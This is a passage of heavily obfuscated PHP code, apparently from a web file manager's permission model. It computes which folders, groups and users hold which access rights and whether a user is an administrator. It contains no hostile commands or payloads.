ÇÌ‰[$D¤Ú¤è¡õÆ[1830]]); if (!$c´’š§šŠ×) { continue; } if ($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[406]] == SourceModel::TYPE_USER) { $aÒßô‰‘éó = Model($D¤Ú¤è¡õÆ[508])->getInfoSimpleOuter($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[499]]); if ($aÒßô‰‘éó[$D¤Ú¤è¡õÆ[1561]] == $D¤Ú¤è¡õÆ[1119]) { continue; } if ($aÒßô‰‘éó[$D¤Ú¤è¡õÆ[1561]] == $D¤Ú¤è¡õÆ[191]) { $aÒßô‰‘éó[$D¤Ú¤è¡õÆ[28]] = LNG($D¤Ú¤è¡õÆ[1906]); } } else { $aÒßô‰‘éó = Model($D¤Ú¤è¡õÆ[517])->getInfoSimple($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[499]]); } goto a—É˜Ü…¸; AİÁ¹İÏÑ„: if ($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[406]] == SourceModel::TYPE_USER && $aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[499]] == $D¤Ú¤è¡õÆ[191]) { $CßÑ“®¾õî = 0; } $eá¿µÇ”ÑÉ[] = $c´’š§šŠ×[$D¤Ú¤è¡õÆ[408]] + $CßÑ“®¾õî; goto EğïëÃŸİÍ; dÊÎËêùÃ–: $CßÑ“®¾õî = 0; if ($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[406]] == SourceModel::TYPE_GROUP) { $CßÑ“®¾õî = $e»ù‡‰£Ü¢ * 2; } if ($aŒÂ ÇÌ‰[$D¤Ú¤è¡õÆ[406]] == SourceModel::TYPE_USER) { $CßÑ“®¾õî = $e»ù‡‰£Ü¢; } goto AİÁ¹İÏÑ„; EğïëÃŸİÍ: } array_multisort($eá¿µÇ”ÑÉ, SORT_DESC, $f‰×ê¨ÑÎÑ); goto fĞ·ĞÌ³ñç; fĞ·ĞÌ³ñç: return $f‰×ê¨ÑÎÑ; goto BÊÌÈê‚‡ö; AĞœÎä½…Ñ: $D¤Ú¤è¡õÆ =& $_SERVER[Ö‘Øù]; $f‰×ê¨ÑÎÑ = array(); $eá¿µÇ”ÑÉ = array(); goto dõÉÎçáˆ; BÊÌÈê‚‡ö: } public function getAllChildrenByUser($E¾îÍÎí, $Eš‡ƒ”ËÍ) { goto BåèÒĞÊæÓ; fóâ˜Ûë¾›: $bÅëçŠÖ÷ = Model($b¾÷¼ñ³ñ[1240])->sourceInfo($E¾îÍÎí); $B™±ÅÒäµ = array(); $fÒÜš÷á¾ = 1; goto B­ïÜ–Ü; BåèÒĞÊæÓ: $b¾÷¼ñ³ñ =& $_SERVER[Ö‘Øù]; $BÔßéÏéİ— = Model($b¾÷¼ñ³ñ[533])->getInfo($Eš‡ƒ”ËÍ); if (!$Eš‡ƒ”ËÍ || !$E¾îÍÎí || !$BÔßéÏéİ—) { return array(); } goto fóâ˜Ûë¾›; E¾„êá•¸: foreach ($fĞÚêá„Š¾ as $E«›Ÿ—„Õø) { $cñØßÁğÌ = !1; foreach ($E«›Ÿ—„Õø[$b¾÷¼ñ³ñ[1904]] as $fä¡§™Ù­³) { if ($fä¡§™Ù­³[$b¾÷¼ñ³ñ[1561]]) { if ($fä¡§™Ù­³[$b¾÷¼ñ³ñ[1561]] == $Eš‡ƒ”ËÍ) { $cñØßÁğÌ = !0; break; } } if ($fä¡§™Ù­³[$b¾÷¼ñ³ñ[1730]]) { if ($this->groupContainUser($fä¡§™Ù­³[$b¾÷¼ñ³ñ[1730]], $Eš‡ƒ”ËÍ)) { $cñØßÁğÌ = !0; break; } } } if ($cñØßÁğÌ) { $bÕº˜æŒ[] = $E«›Ÿ—„Õø; } $DŒÎƒ‰ìø = $E«›Ÿ—„Õø[$b¾÷¼ñ³ñ[397]]; if (isset($B™±ÅÒäµ[$DŒÎƒ‰ìø])) { $E«›Ÿ—„Õø[$b¾÷¼ñ³ñ[1904]][] = $B™±ÅÒäµ[$DŒÎƒ‰ìø][0]; $B™±ÅÒäµ[$DŒÎƒ‰ìø] = !1; } } $B™±ÅÒäµ = array_filter(array_values($B™±ÅÒäµ)); $bÕº˜æŒ = array_merge($B™±ÅÒäµ, $bÕº˜æŒ); goto D’¶ê›‹ò; B­ïÜ–Ü: if ($bÅëçŠÖ÷[$b¾÷¼ñ³ñ[493]] == $b¾÷¼ñ³ñ[191] && $bÅëçŠÖ÷[$b¾÷¼ñ³ñ[499]] != $fÒÜš÷á¾ && $this->groupContainUser($bÅëçŠÖ÷[$b¾÷¼ñ³ñ[499]], $Eš‡ƒ”ËÍ)) { foreach ($BÔßéÏéİ—[$b¾÷¼ñ³ñ[1907]] as $c˜â‡ëç¤) { $bæ‰Şõî×Ò = Model($b¾÷¼ñ³ñ[517])->getInfo($c˜â‡ëç¤[$b¾÷¼ñ³ñ[1730]]); $d„ËÁê‡‡Š = Model($b¾÷¼ñ³ñ[533])->getInfoSimpleOuter($Eš‡ƒ”ËÍ); $d„ËÁê‡‡Š[$b¾÷¼ñ³ñ[461]] = $c˜â‡ëç¤[$b¾÷¼ñ³ñ[408]]; if (Model($b¾÷¼ñ³ñ[502])->authCheckAction($c˜â‡ëç¤[$b¾÷¼ñ³ñ[408]][$b¾÷¼ñ³ñ[408]], $b¾÷¼ñ³ñ[1750])) { continue; } $cÃ˜ÀÆĞ‹Ö = array($b¾÷¼ñ³ñ[28] => $b¾÷¼ñ³ñ[1513] . $bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[28]], $b¾÷¼ñ³ñ[397] => $bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[85]][$b¾÷¼ñ³ñ[397]], $b¾÷¼ñ³ñ[76] => KodIO::make($bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[85]][$b¾÷¼ñ³ñ[397]]), $b¾÷¼ñ³ñ[493] => $b¾÷¼ñ³ñ[191], $b¾÷¼ñ³ñ[406] => $b¾÷¼ñ³ñ[510], $b¾÷¼ñ³ñ[29] => $b¾÷¼ñ³ñ[543], $b¾÷¼ñ³ñ[514] => $bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[521]], $b¾÷¼ñ³ñ[1730] => $bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[1730]], $b¾÷¼ñ³ñ[518] => $bæ‰Şõî×Ò[$b¾÷¼ñ³ñ[493]], $b¾÷¼ñ³ñ[1904] => array($d„ËÁê‡‡Š)); $B™±ÅÒäµ[$cÃ˜ÀÆĞ‹Ö[$b¾÷¼ñ³ñ[397]]] = $cÃ˜ÀÆĞ‹Ö; } } $bÕº˜æŒ = array(); $fĞÚêá„Š¾ = $this->getAllChildren($E¾îÍÎí); goto E¾„êá•¸; D’¶ê›‹ò: return $bÕº˜æŒ; goto bİòçêÂñÛ; bİòçêÂñÛ: } public function setAllChildrenByUser($e©…¯‰ö¦Â, $A¢ÆéÜíîÜ, $f­öóÌ„) { $dõ‚Ìç§ÕÚ =& $_SERVER[Ö‘Øù]; $aˆëÈ­¯Êô = $this->getAllChildrenByUser($e©…¯‰ö¦Â, $A¢ÆéÜíîÜ); if (!$f­öóÌ„ || !$aˆëÈ­¯Êô) { return !1; } foreach ($aˆëÈ­¯Êô as $EÑå§·–‰) { $bğŠäÚŠ¶ï = array(); foreach ($EÑå§·–‰[$dõ‚Ìç§ÕÚ[1904]] as $c¥ˆ¸•­³”) { $EŸ‡¢‰Œ² = $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[461]]; $AÆÕÎö = $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1561]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $eŠ×îË©ƒ­ = $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1561]] ? $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1561]] : $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1730]]; if ($c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1561]] && $c¥ˆ¸•­³”[$dõ‚Ìç§ÕÚ[1561]] == $A¢ÆéÜíîÜ) { continue; } $bğŠäÚŠ¶ï[] = array($dõ‚Ìç§ÕÚ[397] => $EÑå§·–‰[$dõ‚Ìç§ÕÚ[397]], $dõ‚Ìç§ÕÚ[406] => $AÆÕÎö, $dõ‚Ìç§ÕÚ[499] => intval($eŠ×îË©ƒ­), $dõ‚Ìç§ÕÚ[1830] => isset($EŸ‡¢‰Œ²[$dõ‚Ìç§ÕÚ[395]]) ? intval($EŸ‡¢‰Œ²[$dõ‚Ìç§ÕÚ[395]]) : 0, $dõ‚Ìç§ÕÚ[1884] => isset($EŸ‡¢‰Œ²[$dõ‚Ìç§ÕÚ[1884]]) ? intval($EŸ‡¢‰Œ²[$dõ‚Ìç§ÕÚ[1884]]) : -1); } $bğŠäÚŠ¶ï[] = array($dõ‚Ìç§ÕÚ[397] => $EÑå§·–‰[$dõ‚Ìç§ÕÚ[397]], $dõ‚Ìç§ÕÚ[406] => SourceModel::TYPE_USER, $dõ‚Ìç§ÕÚ[499] => intval($A¢ÆéÜíîÜ), $dõ‚Ìç§ÕÚ[1830] => intval($f­öóÌ„), $dõ‚Ìç§ÕÚ[1884] => -1); $this->where(array($dõ‚Ìç§ÕÚ[412] => $EÑå§·–‰[$dõ‚Ìç§ÕÚ[397]]))->delete(); $this->addAll($bğŠäÚŠ¶ï); } return !0; } public function get($CÊà…ºì¯Æ) { $bµğÍ½…® = $this->getSourceList(array($CÊà…ºì¯Æ), !0); return $bµğÍ½…®[0]; } public function getSourceList($AÌ“»ÄÓÇ, $BŠ­ÔÂï„ = false, $d‚‘²ˆìê = false) { goto BÉòØôé±ˆ; B–¡íØÖÕÚ: if (!$BŠ­ÔÂï„ && count($AÌ“»ÄÓÇ) == 1) { $BŠ­ÔÂï„ = array(); $BŠ­ÔÂï„[$AÌ“»ÄÓÇ[0]] = $aÏÙÆÒìŸ¯->sourceInfo($AÌ“»ÄÓÇ[0]); } if (!$BŠ­ÔÂï„) { $A£Ú¼´Ù²ø = array($C¢¶‡ê„š†[412] => array($C¢¶‡ê„š†[413], $AÌ“»ÄÓÇ)); $BŠ­ÔÂï„ = $aÏÙÆÒìŸ¯->field($C¢¶‡ê„š†[1908])->where($A£Ú¼´Ù²ø)->select(); $BŠ­ÔÂï„ = array_to_keyvalue($BŠ­ÔÂï„, $C¢¶‡ê„š†[397]); } $D¢îƒÌÃ· = $AÌ“»ÄÓÇ; goto bŸçáïÌÑğ; eƒ†Ò¥¦Ÿ: $fÖÃàïøö¯ = array(); foreach ($BŠ­ÔÂï„ as $FœÔ¬ß½¤Ğ => $E†‹¸…Ó³©) { if ($a‹ÒìÆÀÀ) { $fÖÃàïøö¯[$FœÔ¬ß½¤Ğ] = $b„ø‹Õ£„©; continue; } $fÖÃàïøö¯[$FœÔ¬ß½¤Ğ] = $this->makeSourceAuth($E†‹¸…Ó³©, $AÏÂ²‘¾³, $d‚‘²ˆìê); } return $fÖÃàïøö¯; goto c…ëŞ“â­; bó¦¾—ƒÁà: $a‹ÒìÆÀÀ = $this->userIsRoot($d‚‘²ˆìê); $c†‘íˆô‘‹ = AuthModel::authAll(); $b„ø‹Õ£„© = array($C¢¶‡ê„š†[409] => $c†‘íˆô‘‹, $C¢¶‡ê„š†[1909] => array($C¢¶‡ê„š†[414] => 0, $C¢¶‡ê„š†[1736] => $c†‘íˆô‘‹, $C¢¶‡ê„š†[415] => LNG($C¢¶‡ê„š†[1910]), $C¢¶‡ê„š†[1752] => $C¢¶‡ê„š†[1911])); goto eƒ†Ò¥¦Ÿ; bŸçáïÌÑğ: foreach ($BŠ­ÔÂï„ as $Cå´¤àÏ…Ï => $fæàÆ÷¾²„) { $bÎÖÉ¾µ²´ = $aÏÙÆÒìŸ¯->parentLevelArray($fæàÆ÷¾²„[$C¢¶‡ê„š†[516]]); $D¢îƒÌÃ· = array_merge($D¢îƒÌÃ·, array($Cå´¤àÏ…Ï), array_reverse($bÎÖÉ¾µ²´)); } $D¢îƒÌÃ· = array_values(array_unique($D¢îƒÌÃ·)); if (!$D¢îƒÌÃ·) { return array(); } goto aŠñ»ªœ–ô; aŠñ»ªœ–ô: $CÌ¦–¸öç› = $this->sourceAuthSelect($D¢îƒÌÃ·); $AÏÂ²‘¾³ = array(); foreach ($D¢îƒÌÃ· as $FœÔ¬ß½¤Ğ) { if (isset($CÌ¦–¸öç›[$FœÔ¬ß½¤Ğ])) { $AÏÂ²‘¾³[$FœÔ¬ß½¤Ğ] = $CÌ¦–¸öç›[$FœÔ¬ß½¤Ğ]; } } goto bó¦¾—ƒÁà; BÉòØôé±ˆ: $C¢¶‡ê„š† =& $_SERVER[Ö‘Øù]; if (!$AÌ“»ÄÓÇ) { return array(); } $aÏÙÆÒìŸ¯ = Model($C¢¶‡ê„š†[1240]); goto B–¡íØÖÕÚ; c…ëŞ“â­: } public function authDeepCheck($EÒ“ÕÆÔóö, $AŠ™…—‚½Ô = false) { goto bÎ…ùèŸé™; Eö‹î‹Œ¡í: if (!$C ìó«é‡ˆ) { return !1; } $dÜöì®òŞ = $C ìó«é‡ˆ ? $C ìó«é‡ˆ[0] : $EÒ“ÕÆÔóö; return array($BŠ¿Ó£´ÜÈ[409] => -1, $BŠ¿Ó£´ÜÈ[461] => array($BŠ¿Ó£´ÜÈ[414] => $BŠ¿Ó£´ÜÈ[1119], $BŠ¿Ó£´ÜÈ[1736] => $BŠ¿Ó£´ÜÈ[191], $BŠ¿Ó£´ÜÈ[415] => LNG($BŠ¿Ó£´ÜÈ[1914]), $BŠ¿Ó£´ÜÈ[1752] => $BŠ¿Ó£´ÜÈ[1915]), $BŠ¿Ó£´ÜÈ[1916] => LNG($BŠ¿Ó£´ÜÈ[1917]), $BŠ¿Ó£´ÜÈ[1918] => $this->sourceAuthInfo($dÜöì®òŞ)); goto EÛåæô‚¯®; bÎ…ùèŸé™: $BŠ¿Ó£´ÜÈ =& $_SERVER[Ö‘Øù]; $AŠ™…—‚½Ô = $AŠ™…—‚½Ô ? $AŠ™…—‚½Ô : USER_ID; $bø¼È˜ëò = $this->makeAuthDeep($AŠ™…—‚½Ô); goto cÈ¸Ÿ¯ŒÒ; cÈ¸Ÿ¯ŒÒ: if (!in_array($EÒ“ÕÆÔóö, $bø¼È˜ëò[$BŠ¿Ó£´ÜÈ[1912]])) { return !1; } $C ìó«é‡ˆ = array(); foreach ($bø¼È˜ëò[$BŠ¿Ó£´ÜÈ[1913]] as $C†°‡„Ü => $E¤ÅÑ†ê‡í) { if (!in_array($EÒ“ÕÆÔóö, $E¤ÅÑ†ê‡í)) { continue; } $C ìó«é‡ˆ[] = $C†°‡„Ü; } goto Eö‹î‹Œ¡í; EÛåæô‚¯®: } protected function makeAuthDeep($e­ÒÔ¢Şé = false) { goto d„·¨°“•ğ; A¨ÙñšõÌï: if (isset($bÈìÂÅ¯Œ[$e­ÒÔ¢Şé])) { return $bÈìÂÅ¯Œ[$e­ÒÔ¢Şé]; } $EÙ«¬ñÈÛÕ = Model($aå†Í®ë£í[1919])->listData(); $f¤Ş¿Âƒµ = array(); goto aÁ”íç£ §; d„·¨°“•ğ: $aå†Í®ë£í =& $_SERVER[Ö‘Øù]; static $bÈìÂÅ¯Œ = array(); $e­ÒÔ¢Şé = $e­ÒÔ¢Şé ? $e­ÒÔ¢Şé : USER_ID; goto A¨ÙñšõÌï; cÂ­ÓÏÚŸ™: $aŠåùÀ‰Æ = $AöË˜‡âÕ¼; $CÁ¾Ûù•·È = Model($aå†Í®ë£í[1240]); $Fç•¶˜›÷ = Model($aå†Í®ë£í[517]); goto A…ï•ÕöÀÁ; A…ï•ÕöÀÁ: $aË³İÄËá = array(); $BÑÖë¼¦ = array(); $f–İîƒ¡ = array(); goto B”²›ÍåÄÖ; DÂº¼ˆ²¬å: $EèƒµÓ› = array_to_keyvalue_group($dÊ¬Ûí˜÷, $aå†Í®ë£í[397]); foreach ($EèƒµÓ› as $A£†‘ùÇ™™ => $FÙ»¼Õğ) { $e”Óîèäå = $this->authArrayCheck($FÙ»¼Õğ, $e­ÒÔ¢Şé); if ($e”Óîèäå[$aå†Í®ë£í[409]] > 0) { $cƒø¾Œ„Ş[] = $A£†‘ùÇ™™ . $aå†Í®ë£í[33]; } } $bÇ­ÚÓÁ = array(); goto cÂ­ÓÏÚŸ™; aÁ”íç£ §: foreach ($EÙ«¬ñÈÛÕ as $AÚÏ±âœ²) { if ($AÚÏ±âœ²[$aå†Í®ë£í[408]] == 0 && $AÚÏ±âœ²[$aå†Í®ë£í[1751]] == $aå†Í®ë£í[87]) { $f¤Ş¿Âƒµ[] = $AÚÏ±âœ²[$aå†Í®ë£í[395]]; } } $AöË˜‡âÕ¼ = $this->userGroupParents($e­ÒÔ¢Şé); $a×Û»îáÁƒ = array($aå†Í®ë£í[406] => SourceModel::TYPE_USER, $aå†Í®ë£í[499] => $e­ÒÔ¢Şé); goto d“³“±¾¢á; C°Š”˜£¦: $aàŸÚÊ² = array($aå†Í®ë£í[1912] => $bÇ­ÚÓÁ, $aå†Í®ë£í[1913] => $aË³İÄËá); $bÈìÂÅ¯Œ[$e­ÒÔ¢Şé] = $aàŸÚÊ²; return $aàŸÚÊ²; goto eØƒ‰¢—õŠ; fê¡³”×Üù: foreach ($aŠåùÀ‰Æ as $e¢‡Î¾ñÜÈ) { $c×§Õæòß = $Fç•¶˜›÷->getInfo($e¢‡Î¾ñÜÈ); $bÇ­ÚÓÁ[] = $c×§Õæòß[$aå†Í®ë£í[85]][$aå†Í®ë£í[397]]; $f–İîƒ¡[$e¢‡Î¾ñÜÈ] = $c×§Õæòß[$aå†Í®ë£í[85]][$aå†Í®ë£í[397]]; $AéİÍèâ¥ƒ[$e¢‡Î¾ñÜÈ] = $CÁ¾Ûù•·È->parentLevelArray($c×§Õæòß[$aå†Í®ë£í[516]]); } foreach ($aË³İÄËá as $Díâ»àà¬ => $fÆ¬Êà¥­®) { $F–©É×›éŒ = $BÑÖë¼¦[$Díâ»àà¬]; if (!$F–©É×›éŒ || !$f–İîƒ¡[$F–©É×›éŒ]) { continue; } $F›‡ùİö®Ë = array(); foreach ($AéİÍèâ¥ƒ[$F–©É×›éŒ] as $e¢‡Î¾ñÜÈ) { $F›‡ùİö®Ë[] = $f–İîƒ¡[$e¢‡Î¾ñÜÈ]; } $aË³İÄËá[$Díâ»àà¬] = array_merge($F›‡ùİö®Ë, $fÆ¬Êà¥­®); } $bÇ­ÚÓÁ = array_values(array_unique($bÇ­ÚÓÁ)); goto C°Š”˜£¦; B”²›ÍåÄÖ: $AéİÍèâ¥ƒ = array(); if ($cƒø¾Œ„Ş) { $eÉ“ŠˆŞÛÊ = $CÁ¾Ûù•·È->where(array($aå†Í®ë£í[397] => array($aå†Í®ë£í[413], $cƒø¾Œ„Ş)))->select(); foreach ($eÉ“ŠˆŞÛÊ as $a¶ïáãà¤“) { $D¾‹Õ²• = $CÁ¾Ûù•·È->parentLevelArray($a¶ïáãà¤“[$aå†Í®ë£í[516]]); $bÇ­ÚÓÁ = array_merge($bÇ­ÚÓÁ, $D¾‹Õ²•); $aŠåùÀ‰Æ[] = $a¶ïáãà¤“[$aå†Í®ë£í[499]]; $aË³İÄËá[$a¶ïáãà¤“[$aå†Í®ë£í[397]]] = $D¾‹Õ²•; $BÑÖë¼¦[$a¶ïáãà¤“[$aå†Í®ë£í[397]]] = $a¶ïáãà¤“[$aå†Í®ë£í[499]]; } } $aŠåùÀ‰Æ = array_values(array_unique($aŠåùÀ‰Æ)); goto BÎ°Ëê¶É; d“³“±¾¢á: if ($AöË˜‡âÕ¼) { $a×Û»îáÁƒ = array(array($aå†Í®ë£í[406] => SourceModel::TYPE_USER, $aå†Í®ë£í[499] => $e­ÒÔ¢Şé), array($aå†Í®ë£í[406] => SourceModel::TYPE_GROUP, $aå†Í®ë£í[499] => array($aå†Í®ë£í[413], $AöË˜‡âÕ¼)), $aå†Í®ë£í[993] => $aå†Í®ë£í[1822]); } $dÊ¬Ûí˜÷ = $this->field($aå†Í®ë£í[1920])->where($a×Û»îáÁƒ)->select(); $cƒø¾Œ„Ş = array(); goto DÂº¼ˆ²¬å; BÎ°Ëê¶É: $AÖƒ·õßœ = $aŠåùÀ‰Æ; foreach ($AÖƒ·õßœ as $e¢‡Î¾ñÜÈ) { $c×§Õæòß = $Fç•¶˜›÷->getInfo($e¢‡Î¾ñÜÈ); $D¾‹Õ²• = $CÁ¾Ûù•·È->parentLevelArray($c×§Õæòß[$aå†Í®ë£í[516]]); $aŠåùÀ‰Æ = array_merge($aŠåùÀ‰Æ, $D¾‹Õ²•); } $aŠåùÀ‰Æ = array_values(array_unique($aŠåùÀ‰Æ)); goto fê¡³”×Üù; eØƒ‰¢—õŠ: } private function makeSourceAuth($a¿Í«¸Ø­, $f’Œ¡ùÀ•, $F¨áªÑÔà = false) { goto eÅ¶£Â Ç½; añ¶¡–ÏİÉ: if (!$b¬¡ô¼Ê¬¼) { $DŠ’­—»ÑÈ = Model($AÂ·âÉ®®[517])->getInfo($bÂ§ÃµÉß×); $c™ºé³á ï = explode($AÂ·âÉ®®[47], trim($DŠ’­—»ÑÈ[$AÂ·âÉ®®[516]], $AÂ·âÉ®®[47])); $c™ºé³á ï = array_reverse($c™ºé³á ï); foreach ($c™ºé³á ï as $fºãäÏñá) { if ($fºãäÏñá == $AÂ·âÉ®®[191] || $fºãäÏñá == $D˜…çî»’’) { continue; } $d†‚¹«ÈÜ“ = $this->groupRootAuth($fºãäÏñá, $F¨áªÑÔà); if (!$d†‚¹«ÈÜ“) { continue; } $b¬¡ô¼Ê¬¼ = $this->groupAuthInfo($d†‚¹«ÈÜ“, $fºãäÏñá); break; } } if (!$b¬¡ô¼Ê¬¼ || $b¬¡ô¼Ê¬¼[$AÂ·âÉ®®[409]] <= 0) { $có½æÍæ¹å = $this->authDeepCheck($a¿Í«¸Ø­[$AÂ·âÉ®®[397]], $F¨áªÑÔà); if ($có½æÍæ¹å) { $b¬¡ô¼Ê¬¼ = $có½æÍæ¹å; } } return $b¬¡ô¼Ê¬¼; goto eÁ«Šî›ÒÂ; b…ÛÆÛ«õ: foreach ($C®Ò˜Óàó¥ as $eïÄØˆÈÔ©) { if (!isset($f’Œ¡ùÀ•[$eïÄØˆÈÔ©])) { continue; } $AÄ’Å‡ì†‘ = $this->authMake($f’Œ¡ùÀ•[$eïÄØˆÈÔ©], $F¨áªÑÔà); if ($AÄ’Å‡ì†‘[$AÂ·âÉ®®[461]]) { $b¬¡ô¼Ê¬¼ = $AÄ’Å‡ì†‘; break; } } if (!$bë„Ï£œ¯Ê) { return $b¬¡ô¼Ê¬¼; } if (!$b¬¡ô¼Ê¬¼ && $DÃÉª¤Ú·) { $b¬¡ô¼Ê¬¼ = $this->groupAuthInfo($DÃÉª¤Ú·, $bÂ§ÃµÉß×); } goto añ¶¡–ÏİÉ; eÅ¶£Â Ç½: $AÂ·âÉ®® =& $_SERVER[Ö‘Øù]; $D˜…çî»’’ = $AÂ·âÉ®®[87]; $bÂ§ÃµÉß× = $a¿Í«¸Ø­[$AÂ·âÉ®®[499]]; goto f¡±™¬Åê¸; eĞí¨äğ¨„: $C®Ò˜Óàó¥ = Model($AÂ·âÉ®®[1240])->parentLevelArray($a¿Í«¸Ø­[$AÂ·âÉ®®[516]]); $C®Ò˜Óàó¥ = array_merge(array($a¿Í«¸Ø­[$AÂ·âÉ®®[397]]), array_reverse($C®Ò˜Óàó¥)); $b¬¡ô¼Ê¬¼ = !1; goto b…ÛÆÛ«õ; f¡±™¬Åê¸: $bë„Ï£œ¯Ê = $a¿Í«¸Ø­[$AÂ·âÉ®®[406]] == SourceModel::TYPE_GROUP; $DÃÉª¤Ú· = $bë„Ï£œ¯Ê ? $this->groupRootAuth($bÂ§ÃµÉß×, $F¨áªÑÔà) : !1; if ($DÃÉª¤Ú· && Model($AÂ·âÉ®®[502])->authCheckAction($DÃÉª¤Ú·[$AÂ·âÉ®®[408]], $AÂ·âÉ®®[1750])) { return $this->groupAuthInfo($DÃÉª¤Ú·, $bÂ§ÃµÉß×); } goto eĞí¨äğ¨„; eÁ«Šî›ÒÂ: } private function userIsRoot($DÃß¹½Ë¹‚ = false) { $EÚÛÑš =& $_SERVER[Ö‘Øù]; if (!$DÃß¹½Ë¹‚ && _get($GLOBALS, $EÚÛÑš[500])) { return !0; } $E“êÌÍÊ = Model($EÚÛÑš[533])->getInfo($DÃß¹½Ë¹‚); $aĞ‰­˜¤Ø¯ = Model($EÚÛÑš[1921])->listData($E“êÌÍÊ[$EÚÛÑš[1444]]); if ($aĞ‰­˜¤Ø¯ && $aĞ‰­˜¤Ø¯[$EÚÛÑš[506]][$EÚÛÑš[1922]] == 1) { return !0; } return !1; } private function sourceAuthInfo($cÆ´çŠŒ°±) { goto c©Ş…®á¦¿; Fê”»èÚ‹‡: $DÛ–ª‰öôÕ = $EÏœ‘œ…’->_listAppendPath($DÛ–ª‰öôÕ); $Bòó™‚×áê = $DÛ–ª‰öôÕ[0]; $cÎÑá©ÜÌ = $Bòó™‚×áê[$e’Ö‚‚¨[514]]; goto A¼„ŞŒï´æ; A¼„ŞŒï´æ: if (isset($Bòó™‚×áê[$e’Ö‚‚¨[522]])) { $EÊ¶–ÑÊÍ = explode($e’Ö‚‚¨[8], trim($Bòó™‚×áê[$e’Ö‚‚¨[514]], $e’Ö‚‚¨[8])); array_shift($EÊ¶–ÑÊÍ); $cÎÑá©ÜÌ = $Bòó™‚×áê[$e’Ö‚‚¨[520]] . $e’Ö‚‚¨[1923] . implode($e’Ö‚‚¨[8], $EÊ¶–ÑÊÍ); } return array($e’Ö‚‚¨[415] => $Bòó™‚×áê[$e’Ö‚‚¨[28]], $e’Ö‚‚¨[76] => KodIO::make($Bòó™‚×áê[$e’Ö‚‚¨[397]]), $e’Ö‚‚¨[1924] => $cÎÑá©ÜÌ); goto AÈ°©Ë¡ßÏ; c©Ş…®á¦¿: $e’Ö‚‚¨ =& $_SERVER[Ö‘Øù]; $EÏœ‘œ…’ = Model($e’Ö‚‚¨[1240]); $Bòó™‚×áê = $EÏœ‘œ…’->sourceInfo($cÆ´çŠŒ°±); goto CØ†öë¦ºŠ; CØ†öë¦ºŠ: if (!$Bòó™‚×áê) { return !1; } $EÏœ‘œ…’->groupPathDisplay($Bòó™‚×áê); $DÛ–ª‰öôÕ = array($Bòó™‚×áê); goto Fê”»èÚ‹‡; AÈ°©Ë¡ßÏ: } private function groupAuthInfo($c“ª§Ø¿‹, $c§¿™”œ) { $C¼÷£·Ú =& $_SERVER[Ö‘Øù]; $fÖ«§Ç = Model($C¼÷£·Ú[517])->getInfo($c§¿™”œ); return array($C¼÷£·Ú[1925] => intval($c“ª§Ø¿‹[$C¼÷£·Ú[408]]), $C¼÷£·Ú[1909] => $c“ª§Ø¿‹, $C¼÷£·Ú[1926] => LNG($C¼÷£·Ú[1927]), $C¼÷£·Ú[1918] => array($C¼÷£·Ú[415] => $fÖ«§Ç[$C¼÷£·Ú[28]], $C¼÷£·Ú[76] => KodIO::make($fÖ«§Ç[$C¼÷£·Ú[85]][$C¼÷£·Ú[397]]), $C¼÷£·Ú[1924] => $fÖ«§Ç[$C¼÷£·Ú[521]])); } protected function groupRootAuth($F„÷‘­œïì, $aÏÊ†ïŠéô = false) { goto D¹¢›éåÉ; DéÕÔ¯ÁÃÀ: $B˜µØìÒ = $this->userGroupList($aÏÊ†ïŠéô); $b”Íšˆ·Ó = isset($B˜µØìÒ[$F„÷‘­œïì]) ? $B˜µØìÒ[$F„÷‘­œïì][$bŠÓ´Ç[408]] : !1; if ($b”Íšˆ·Ó && Model($bŠÓ´Ç[502])->authCheckAction($b”Íšˆ·Ó[$bŠÓ´Ç[408]], $bŠÓ´Ç[1750])) { $cÂÏ‘ñ…¿Û[$Cö»ÏñÒ‘™] = $b”Íšˆ·Ó; return $b”Íšˆ·Ó; } goto E‰£æÃ„‡; D¹¢›éåÉ: $bŠÓ´Ç =& $_SERVER[Ö‘Øù]; $aÏÊ†ïŠéô = $aÏÊ†ïŠéô ? $aÏÊ†ïŠéô : USER_ID; $Cö»ÏñÒ‘™ = $aÏÊ†ïŠéô . $bŠÓ´Ç[1928] . $F„÷‘­œïì; goto CŠ§ÛòÙ¼˜; CŠ§ÛòÙ¼˜: static $cÂÏ‘ñ…¿Û = array(); if (isset($cÂÏ‘ñ…¿Û[$Cö»ÏñÒ‘™])) { return $cÂÏ‘ñ…¿Û[$Cö»ÏñÒ‘™]; } $a³„ÚƒŒ†© = Model($bŠÓ´Ç[517])->getInfo($F„÷‘­œïì); goto DéÕÔ¯ÁÃÀ; E‰£æÃ„‡: $d²ì¥³‡Õä = $this->sourceAuthSelect($a³„ÚƒŒ†©[$bŠÓ´Ç[85]][$bŠÓ´Ç[397]]); $A¬íˆÖ¤Í‡ = $d²ì¥³‡Õä ? $this->authMake($d²ì¥³‡Õä, $aÏÊ†ïŠéô) : !1; $aƒµ’Ï…ÙÈ = $A¬íˆÖ¤Í‡ ? $A¬íˆÖ¤Í‡[$bŠÓ´Ç[461]] : !1; goto C‚¬¥Ÿİè; C‚¬¥Ÿİè: $cÂÏ‘ñ…¿Û[$Cö»ÏñÒ‘™] = $aƒµ’Ï…ÙÈ ? $aƒµ’Ï…ÙÈ : $b”Íšˆ·Ó; return $cÂÏ‘ñ…¿Û[$Cö»ÏñÒ‘™]; goto Bä¢¢¶ŸÌÚ; Bä¢¢¶ŸÌÚ: } public function authOwnerApply($a½ÚÎ’˜Çø) { goto EôÇùËèÔ; cºˆ¤“¼ÇŒ: $EĞƒ®½®í = 